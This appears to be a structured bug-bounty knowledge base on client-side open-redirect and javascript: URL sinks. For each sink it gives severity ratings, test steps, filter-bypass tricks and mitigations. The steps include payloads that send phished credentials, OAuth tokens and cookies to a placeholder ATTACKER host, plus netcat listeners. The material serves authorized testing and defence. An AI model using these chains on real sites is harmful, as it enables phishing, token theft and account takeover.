sinks.name: location.href
sinks.severity_note: Standalone open redirect is P4/P5 or out of scope; P3 when chained to OAuth token theft or credential phishing; P2 when a javascript: scheme executes, because that is DOM XSS.
sinks.explain: Assigning a string to location.href navigates the current tab to that URL. When any part of the string is attacker-controlled the page becomes a redirector, and if the scheme survives as javascript: the assignment executes script in the page origin.
sinks.how_it_works: The browser parses the assigned value as a URL. Relative, protocol-relative (//ATTACKER), absolute and javascript: values are all legal. Code that reads next/returnUrl/redirect parameters and assigns them verbatim hands navigation control to whoever crafts the link.
sinks.why_it_matters: Open redirect is the standard phishing trampoline: a genuine TARGET URL that lands the victim on an attacker clone. Chained into an OAuth implicit flow it leaks access tokens; upgraded to javascript: execution it is full DOM XSS with session access.

steps.action: Trace the redirect parameter into the assignment
steps.command: open 'https://TARGET/account/login?next=https://ATTACKER/phish' in a browser
steps.indicator: after the in-page action the address bar shows https://ATTACKER/phish instead of an internal TARGET page

steps.action: Probe the scheme filter for an XSS upgrade
steps.command: open 'https://TARGET/account/login?next=JaVaScRiPt:alert(document.domain)' in a browser
steps.indicator: an alert box showing the domain fires, proving javascript: execution; if nothing fires, note the redirect-only impact

steps.action: Build the phishing PoC for the report
steps.payload: https://ATTACKER/phish hosts a pixel-perfect clone of the TARGET login form that POSTs credentials to https://ATTACKER/collect
steps.command: run 'nc -lvnp 8080' on the ATTACKER host, then open the crafted TARGET redirect URL and submit test credentials on the clone
steps.indicator: the listener logs a POST body containing the test credentials for YOUR_ACCOUNT

chains.eligibility: Many programs rate a standalone open redirect Low/P4 or list it as out of scope; it becomes reportable when chained to a working credential-phishing demo or OAuth leak, and it is full DOM XSS (usually P2/P3) if a javascript: payload executes.

steps.action: Find the OAuth redirect parameter feeding location.href
steps.command: curl -s 'https://TARGET/oauth/authorize?client_id=web&response_type=token&redirect_uri=https://ATTACKER/cb' -o auth.html && grep -n 'location.href' auth.html
steps.indicator: the redirect target string appears inside a location.href assignment in the served JavaScript

steps.action: Run the crafted authorize URL in a logged-in session
steps.command: open 'https://TARGET/oauth/authorize?client_id=web&response_type=token&redirect_uri=https://ATTACKER/cb' in a browser logged in as YOUR_ACCOUNT
steps.indicator: after consent the browser lands on https://ATTACKER/cb#access_token= with a real token visible in the fragment

steps.action: Capture the leaked token
steps.payload: the ATTACKER/cb page reads location.hash and beacons it to https://ATTACKER/log
steps.command: tail -f /var/log/nginx/access.log on the ATTACKER host
steps.indicator: a log line contains access_token= belonging to YOUR_ACCOUNT

chains.eligibility: Open redirect escalated to OAuth access-token theft is widely accepted at P2-P3; check the program policy on whether implicit-flow token leakage counts as account takeover.

contexts.js-string: the assigned value is a full URL string; scheme allowlisting decides whether javascript: or data: survive
contexts.attr: when the value is first reflected into an href or action attribute, HTML entity encoding does not neutralize a javascript: scheme
contexts.url-query: typical entry parameters: next, returnUrl, redirect, redirect_uri, continue, dest, url

sinks.waf_notes: Server-side WAFs only see the query parameter; fragment-delivered values never reach the server. Scheme filters often match a lowercase 'javascript:' prefix only: try mixed case, leading tab/newline/carriage-return characters, or a protocol-relative '//ATTACKER' value against startswith('/') allowlists, plus backslash variants like '/\ATTACKER'.
sinks.eligibility: Pure open redirect is Low/P4 or explicitly out of scope on many platforms (Google VRP historically accepted it only with demonstrated impact). Chains to OAuth token theft, phishing with a working clone, or javascript: execution are what earn P2/P3.
mitigations: Resolve the value with new URL(v, location.origin) and require url.origin === location.origin before assigning
Reject every scheme except https: (block javascript:, data:, vbscript:)
Map user input to an allowlist of internal route ids instead of raw URLs
Serve a strict redirect interstitial when leaving the origin
references: OWASP WSTG: Testing for Client-Side URL Redirect

sinks.name: location.assign
sinks.severity_note: Same impact class as location.href: P4/P5 as a bare redirect, P3 chained to phishing or token theft, P2 if a javascript: scheme executes.
sinks.explain: location.assign(url) navigates to url while keeping the current page in session history. Attacker-controlled input produces an open redirect; the preserved history entry means pressing Back reloads the redirector, which can fire the redirect again.
sinks.how_it_works: assign() parses the argument exactly like an href assignment: relative, protocol-relative, absolute and (where unfiltered) javascript: values are accepted. Because the redirecting page stays in history, a victim pressing Back returns to the trap and is forwarded again.
sinks.why_it_matters: It is the function-form of location.href seen in frameworks and routers, so it shows up where reviewers grep only for 'location.href'. The Back-button re-forward behavior makes phishing flows sticky and frustrates victim escape.

steps.action: Confirm the fragment reaches assign()
steps.command: open 'https://TARGET/app#url=jlf-trace' in a browser with a breakpoint on the assign() call
steps.indicator: the traced fragment value appears inside the location.assign() argument in DevTools

steps.action: Fire the redirect through the fragment
steps.command: open 'https://TARGET/app#url=https://ATTACKER/landing' in a browser
steps.indicator: the browser navigates to https://ATTACKER/landing while the TARGET access log shows no url= value, proving server-side blindness

steps.action: Demonstrate the sticky history behavior
steps.command: after landing on ATTACKER, press the browser Back button
steps.indicator: the redirector page reloads from TARGET and immediately re-forwards to ATTACKER, so the victim cannot escape via Back

chains.eligibility: Fragment-based redirect is invisible to server logs and WAFs, which strengthens the report narrative, but platform severity still follows open-redirect rules: Low/P4 standalone, higher only with a demonstrated phishing or token-theft chain.

steps.action: Confirm the message handler lacks an origin check
steps.command: open 'https://TARGET/widget' in a browser and run the payload in the console
steps.indicator: the page navigates to https://ATTACKER/x with no origin-validation error in the console

steps.action: Weaponize from a cross-origin parent page
steps.command: host the payload as 'https://ATTACKER/poc.html' and open it in a browser
steps.indicator: the framed TARGET widget is replaced by the ATTACKER clone inside the iframe

chains.eligibility: postMessage-driven redirect requires the victim to visit the attacker page; most platforms accept it as open redirect (Low/P4) and rate it higher only when combined with tabnabbing or a credential-harvest demo.

contexts.js-string: argument is parsed as a URL; identical scheme rules to location.href apply
contexts.url-query: watch router code that maps query parameters into assign() calls after login flows
contexts.event-handler: assign() is frequently wired to button clicks, which adds a user-interaction requirement to the chain

sinks.waf_notes: Same bypass family as location.href: mixed-case schemes, leading control characters, protocol-relative URLs, and backslash confusion against startswith checks. Grep-based review misses assign() when searching only for 'location.href'.
sinks.eligibility: Treated exactly like location.href by triagers: redirect alone is Low/P4 or out of scope; phishing/OAuth/javascript: chains carry the severity.
mitigations: Validate the argument against a same-origin allowlist before calling assign()
Block non-https: schemes explicitly
Use router-level navigation guards instead of raw assign() with user input
Add a leaving-site interstitial for external destinations
references: OWASP WSTG: Testing for Client-Side URL Redirect

sinks.name: location.replace
sinks.severity_note: P4/P5 as a bare redirect; its history-clobbering behavior makes it the preferred phishing redirect primitive, which can nudge a demonstrated chain to P3.
sinks.explain: location.replace(url) navigates to url and removes the current page from session history. With attacker-controlled input it is an open redirect that leaves no way back: the Back button skips the redirector entirely.
sinks.how_it_works: The argument is parsed as a URL like any navigation sink. The distinctive property is history manipulation: after replace() the victim cannot return to the genuine TARGET page, so a credential-harvest clone has the victim's full attention.
sinks.why_it_matters: Phishing kits prefer replace() because the victim cannot press Back to compare with the real site. In reports, demonstrating the unrecoverable navigation materially strengthens the social-engineering impact section.

steps.action: Trace the parameter into replace()
steps.command: curl -s 'https://TARGET/logout?return=https://ATTACKER/clone' | grep -n 'location.replace'
steps.indicator: the response JavaScript passes the return parameter into a location.replace() call

steps.action: Run the redirect and inspect history
steps.command: open 'https://TARGET/logout?return=https://ATTACKER/clone' in a browser, then click the Back button
steps.indicator: the browser returns to the page visited before TARGET; the TARGET redirector page is absent from history

steps.action: Capture credentials on the clone
steps.payload: ATTACKER/clone replicates the TARGET login form and POSTs to https://ATTACKER/collect
steps.command: run 'nc -lvnp 8080' on the ATTACKER host and submit test credentials on the clone
steps.indicator: the listener logs a POST containing the test credentials for YOUR_ACCOUNT

chains.eligibility: Same open-redirect baseline (Low/P4, often out of scope standalone); the Back-button suppression is an aggravating factor worth highlighting, but bounty still depends on the demonstrated phishing chain.

steps.action: Confirm referrer-based routing
steps.command: curl -s 'https://TARGET/landing' -H 'Referer: https://ATTACKER/in' | grep -n 'document.referrer'
steps.indicator: the page JavaScript reads document.referrer and feeds it (or a value derived from it) into location.replace()

steps.action: Trigger the flow as a victim would
steps.command: host the payload at 'https://ATTACKER/in.html', click the link, and watch the address bar
steps.indicator: the browser is replace()-navigated to the attacker-chosen destination without a TARGET entry left in history

chains.eligibility: Referrer-driven redirects need the victim to arrive from an attacker page, which triagers treat like any click-required redirect: P4 unless paired with a convincing credential-theft demo.

contexts.js-string: argument parsed as URL; scheme filtering identical to location.href
contexts.url-query: common on logout/login pages that honor return or continue parameters
contexts.history: replace() deletes the current history entry, which is the security-relevant difference from href/assign

sinks.waf_notes: Standard redirect filter bypasses apply (case, control characters, //ATTACKER, backslashes). Because replace() is common in logout flows, parameters named return/logout_redirect are high-value review targets that WAF rule sets often ignore.
sinks.eligibility: Open redirect severity rules apply: Low/P4 or out of scope standalone; accepted at P3 when a working credential-harvest chain is demonstrated, P2 only if a javascript: scheme executes.
mitigations: Allowlist internal destinations before calling replace()
Reject non-https: schemes and protocol-relative URLs
Prefer fixed post-logout destinations configured server-side
Show an interstitial for any off-origin navigation
references: OWASP WSTG: Testing for Client-Side URL Redirect

sinks.name: window.open
sinks.severity_note: P4 as popup redirect/phishing; P3 as stored XSS when a persisted javascript: URL fires on click; javascript: via window.open executes in the opener origin on some engines, which can raise it to P2.
sinks.explain: window.open(url) opens a new tab or window to url. A tainted url yields attacker-chosen content in a fresh browsing context, and a javascript: url can execute script with the opener page's origin on several engines.
sinks.how_it_works: The first argument is parsed as a URL by the new browsing context. When the value comes from storage or the DOM (profile website fields, share links), a javascript: scheme survives into the new context and runs in the opener's origin in Chrome-class browsers; without noopener the opened page also receives a window.opener handle back.
sinks.why_it_matters: It combines three risks in one sink: popup phishing launched from a trusted tab, one-click or stored XSS via javascript: URLs, and reverse tabnabbing through the opener reference when noopener is missing.

steps.action: Trace the parameter into window.open()
steps.command: curl -s 'https://TARGET/share?popup=https://ATTACKER/clone' | grep -n 'window.open'
steps.indicator: the popup parameter value appears inside a window.open() call in the served JavaScript

steps.action: Fire the popup phishing flow
steps.command: open 'https://TARGET/share?popup=https://ATTACKER/clone' in a browser
steps.indicator: a new tab opens to the ATTACKER clone while the original tab stays on TARGET, lending the clone borrowed trust

steps.action: Probe the javascript: upgrade
steps.command: open 'https://TARGET/share?popup=javascript:alert(document.domain)' in Chrome and in Firefox
steps.indicator: Chrome-class engines execute the alert in the TARGET origin; Firefox blocks it, so record the per-browser result

chains.eligibility: Popup redirect alone is Low/P4; a javascript: payload that executes in the opener origin is reportable XSS (P2/P3). Browser differences matter: state exactly which engine executed the payload.

steps.action: Store a javascript: URL in a profile field rendered via window.open
steps.command: save the payload as the website field of YOUR_ACCOUNT profile on TARGET
steps.indicator: the profile page renders a Visit Website button wired to window.open with the stored value

steps.action: Click the rendered button in a fresh session
steps.command: log in as a second test account, open the attacker's profile, and click the Visit Website button
steps.indicator: the ATTACKER listener logs a request carrying the clicking account's cookie

chains.eligibility: Stored value plus one click on a real feature is accepted as stored DOM XSS on most platforms (typically P3, P2 when any user can be targeted); if only the attacker's own session can click it, it is self-XSS and usually not eligible.

contexts.js-string: first argument parsed as URL; scheme and origin checks decide exploitability
contexts.storage: values persisted in profiles or settings turn the sink into stored XSS when a javascript: scheme survives
contexts.feature-string: the third argument (features) is not attacker-relevant; focus review on the first (url) argument and on missing noopener

sinks.waf_notes: Pop-up blockers only defer window.open to a user gesture; they are not a security control. Scheme filters on the url argument share the location.href bypass family. Reverse tabnabbing needs no filter bypass at all: check for missing noopener in the features string or missing rel on equivalent anchor flows.
sinks.eligibility: Triagers treat tainted window.open as open redirect (P4) unless a javascript: execution or cookie exfiltration is demonstrated. Always document which browser executed the payload and whether a user gesture was required.
mitigations: Validate the url argument against a same-origin/https allowlist
Always pass 'noopener' in the features string or null out newWindow.opener
Block javascript: and data: schemes before opening
Prefer declarative anchors with rel="noopener noreferrer" for user-supplied links

sinks.name: meta refresh
sinks.severity_note: P4 as an HTML-level open redirect; the data:text/html variant is P3 only where the victim engine still honors top-level data: navigation (legacy browsers, some Android WebViews).
sinks.explain: A meta tag with http-equiv="refresh" and content="N;url=TARGET-URL" navigates the page after N seconds with no JavaScript. If attacker input reaches the url segment of the content attribute, the page becomes an HTML-level redirector; historically the url slot also accepted data:text/html markup that executed script.
sinks.how_it_works: The browser parses the content attribute as 'delay;url=target' at the HTML layer, before any script runs. Reflection of a request parameter into that attribute (server-side or via DOM code building the tag) gives an instant, scriptless redirect. Modern Chrome and Firefox block top-level navigation to data: URLs, which neuters the XSS variant on current desktop engines.
sinks.why_it_matters: Meta refresh works with JavaScript disabled, so it bypasses every client-side control and sanitizer pipelines that only neutralize script. It is a reliable phishing trampoline and, on engines that still allow data: top-level navigation, a full XSS vector.

steps.action: Confirm reflection into the refresh tag
steps.command: curl -s 'https://TARGET/bye?next=https://ATTACKER/jlf-trace' | grep -i 'http-equiv'
steps.indicator: the response contains a meta refresh tag whose content attribute carries https://ATTACKER/jlf-trace

steps.action: Fire the scriptless redirect
steps.command: open 'https://TARGET/bye?next=https://ATTACKER/jlf-trace' in a browser with JavaScript disabled
steps.indicator: the browser lands on ATTACKER within the refresh delay even though no script executed

steps.action: Demonstrate the phishing chain
steps.payload: ATTACKER hosts a clone of the TARGET login page posting to https://ATTACKER/collect
steps.command: run 'nc -lvnp 8080' on the ATTACKER host and submit test credentials through the clone
steps.indicator: the listener logs the credentials POST for YOUR_ACCOUNT

chains.eligibility: Functionally identical to an open redirect for triage: Low/P4 or out of scope standalone, elevated only by a working phishing or token-theft demonstration. The scriptless property is a narrative bonus, not a severity change.

steps.action: Probe the data: slot in the url segment
steps.command: curl -s 'https://TARGET/bye?next=data:text/html,<script>alert(document.domain)</script>' | grep -i 'http-equiv'
steps.indicator: the data: URL survives sanitization into the content attribute of the refresh tag

steps.action: Test execution per engine
steps.command: open 'https://TARGET/bye?next=data:text/html,<script>alert(document.domain)</script>' in current Chrome and in the oldest in-scope browser or WebView
steps.indicator: the alert fires on legacy engines and in-scope WebViews; current Chrome and Firefox block the top-level data: navigation, which must be documented honestly

chains.eligibility: XSS via meta refresh data: counts only on engines that still allow top-level data: navigation; name the exact browser or WebView versions that executed the payload, or the report is downgraded to plain open-redirect severity.

contexts.attr: the content attribute mixes delay and URL in one string; quote handling decides breakout and scheme survival
contexts.html-body: the tag executes at parse time with no script required, so CSP script-src offers no protection
contexts.js-string: DOM code assembling the tag via innerHTML or document.write inherits all the dangers of those sinks

sinks.waf_notes: Server WAFs see only the parameter value; filters scanning for script tags miss meta refresh entirely because no script tag is involved. Scheme checks anchored at position 0 miss values padded with spaces or control characters before data: or javascript:. DOM-assembled meta tags never touch server-side filters.
sinks.eligibility: Triage follows open-redirect economics: Low/P4 or out of scope for the plain redirect. The data: XSS escalation is real only on engines that permit top-level data: navigation; without a named executing engine it stays a redirect.
mitigations: Never reflect request parameters into a meta refresh content attribute
Hard-code internal destinations and map user input to route ids
Send a Content-Security-Policy header so injected data: documents have no script capability where honored
Strip or reject meta tags from any user-influenced HTML
references: OWASP WSTG: Testing for Client-Side URL Redirect

sinks.name: javascript: URL
sinks.severity_note: P2 when the payload fires without user interaction (auto-navigation or auto-click); P4 when a victim click on a real link is required and the program weighs social engineering.
sinks.explain: A URL whose scheme is javascript: executes its body as script in the origin of the page that navigates to it. Any sink that builds or assigns URLs (href, location, window.open, form action) becomes XSS the moment an attacker controls the scheme.
sinks.how_it_works: Browsers treat javascript: URLs as code to run in the current document's origin and context. Filters typically try to block the literal scheme string, so the whole attack surface lives in scheme confusion: mixed case, embedded tabs and newlines, HTML entities, and leading control characters.
sinks.why_it_matters: It is the classic DOM XSS escalation: every redirect sink and every URL-bearing attribute must be audited for scheme filtering, because a missed javascript: turns an informational open redirect into session-stealing script execution.

steps.action: Confirm the fragment lands in an href-bearing element
steps.command: open 'https://TARGET/page#javascript:alert(document.domain)' in a browser and inspect the injected link in DevTools
steps.indicator: the anchor's href property contains the javascript: payload, proving the fragment reached the URL assignment

steps.action: Bypass the naive scheme filter
steps.command: open 'https://TARGET/page#java%09script:alert(document.domain)' in a browser and click the injected link
steps.indicator: the alert fires despite a lowercase 'javascript:' filter, because the embedded tab breaks the literal match while the browser still executes the scheme

steps.action: Deliver through a fragment-sharing channel
steps.command: send the URL to a second test account session and have it click the rendered link
steps.indicator: script executes in the TARGET origin with access to the DOM and non-HttpOnly cookies

chains.eligibility: One-click javascript: href injection is accepted as DOM XSS on all major platforms; if the injected link exists only in the attacker's own session it is self-XSS and usually not eligible. Fragment delivery dodges server WAFs, which strengthens the report.

steps.action: Find the parameter that is auto-assigned to a navigation sink
steps.command: curl -s 'https://TARGET/continue?redir=javascript:alert(document.domain)' | grep -n 'redir'
steps.indicator: the redir value flows into a location or href assignment without scheme validation

steps.action: Trigger the zero-click execution
steps.command: open 'https://TARGET/continue?redir=javascript:alert(document.domain)' in a browser
steps.indicator: the alert fires with no click, because the page itself navigates to the javascript: URL

chains.eligibility: Zero-interaction javascript: execution is unambiguous DOM XSS, typically P2/P3 everywhere; the only common rejection is a kill-switch that strips non-http schemes, so capture the absence of filtering on video.

contexts.attr: href and action attributes execute javascript: on activation; HTML encoding of the value does not neutralize the scheme
contexts.js-string: string concatenation building URLs is where scheme checks are most often forgotten
contexts.url-scheme: the entire defense is scheme allowlisting; everything else (encoding, quoting) is cosmetic

sinks.waf_notes: Filter bypass family: mixed case (JaVaScRiPt:), embedded tab/newline/carriage return inside the scheme, leading control characters, and HTML-entity-encoded letters when the value passes through an HTML context. Server WAFs are blind to fragment-delivered payloads.
sinks.eligibility: The XSS upgrade from open redirect to javascript: execution is the single biggest severity jump in this category. Auto-firing chains are accepted as P2/P3 DOM XSS; click-required chains are still accepted but often rated one level lower.
mitigations: Parse every outbound URL with new URL() and allow only https: and relative schemes
Never concatenate user input into URL strings assigned to navigation sinks
Use a CSP with script-src that disallows inline execution to blunt javascript: handlers
Render user links through a sanitizer that strips non-http schemes
references: OWASP: XSS Filter Evasion Cheat Sheet

sinks.name: history.pushState
sinks.severity_note: Cannot cross origins (browsers throw a SecurityError), so standalone impact is cosmetic: P5/informational typical, P4 at best as URL-bar spoofing; the real bounty lives in the downstream sink the pushed route reaches.
sinks.explain: history.pushState(state, title, url) rewrites the address bar without navigating, restricted to the same origin. When the url argument is attacker-influenced, the address bar shows arbitrary same-origin paths, and SPA routers may render attacker-chosen routes from the pushed state.
sinks.how_it_works: pushState and its sibling replaceState only accept URLs on the current origin, so cross-origin phishing is impossible directly. The danger is second-order: routers that read location.hash or pushed state can render a fake view, poison a returnUrl embedded in page state, or feed the value into a DOM XSS sink.
sinks.why_it_matters: Reviewers over-report this sink. Honest assessment: it is a delivery gadget that manipulates what the victim sees in the address bar and what the SPA renders; it earns severity only when chained into UI redress, open redirect, or XSS downstream.

steps.action: Identify the router writing pushed state from the hash
steps.command: open 'https://TARGET/app#/settings' in a browser with a breakpoint on history.pushState
steps.indicator: pushState is invoked with a URL derived from location.hash when the route changes

steps.action: Push a route carrying an attacker parameter
steps.command: open 'https://TARGET/app#/login?next=https://ATTACKER' in a browser
steps.indicator: the SPA renders its login view with the poisoned next parameter now embedded in the page state

steps.action: Check whether the route reaches an XSS-capable sink
steps.command: open 'https://TARGET/app#/jlf-trace-bold' in a browser and inspect the rendered route title
steps.indicator: the route value renders as HTML (bold text), which means the reportable bug is the rendering sink, not pushState itself

chains.eligibility: Standalone pushState manipulation is cosmetic and is frequently closed as P5 or not applicable; report the downstream sink (DOM XSS, open redirect) and cite pushState only as the delivery path.

steps.action: Confirm replaceState or pushState consumes the query
steps.command: curl -s 'https://TARGET/app?fake=/account/security' | grep -n 'pushState'
steps.indicator: the served JavaScript passes the fake parameter into a pushState or replaceState url argument

steps.action: Demonstrate address-bar spoofing
steps.command: open 'https://TARGET/app?fake=/account/security' in a browser
steps.indicator: the address bar displays https://TARGET/account/security while the rendered content is unchanged, enabling spoofed screenshots and social engineering

chains.eligibility: Same-origin URL-bar spoofing is generally informational to P4; several programs exclude it explicitly in policy. Include it only as supporting evidence for a larger UI-redress chain.

contexts.js-string: the url argument must stay same-origin; any cross-origin attempt throws a SecurityError visible in the console
contexts.spa-router: routers that derive pushed URLs from the hash or query are the realistic exposure point
contexts.address-bar: impact is limited to what the victim sees and what the SPA renders from the forged state

sinks.waf_notes: No server request is made by pushState, so server-side WAFs never observe the forged URL. The meaningful control is router-side validation of route parameters before they hit rendering or navigation sinks.
sinks.eligibility: Be honest in triage: pushState alone cannot leave the origin, cannot steal data, and cannot execute script. Platforms pay for the chain it enables (XSS, open redirect, convincing UI redress), not for the address-bar manipulation itself.
mitigations: Validate route parameters in the SPA router before use
Never feed pushed state into innerHTML or navigation sinks unchecked
Treat the address bar as untrusted in anti-phishing UX (no security decisions from the path)
Use replaceState over pushState for ephemeral state to limit history pollution
references: OWASP WSTG: Testing for Client-Side URL Redirect
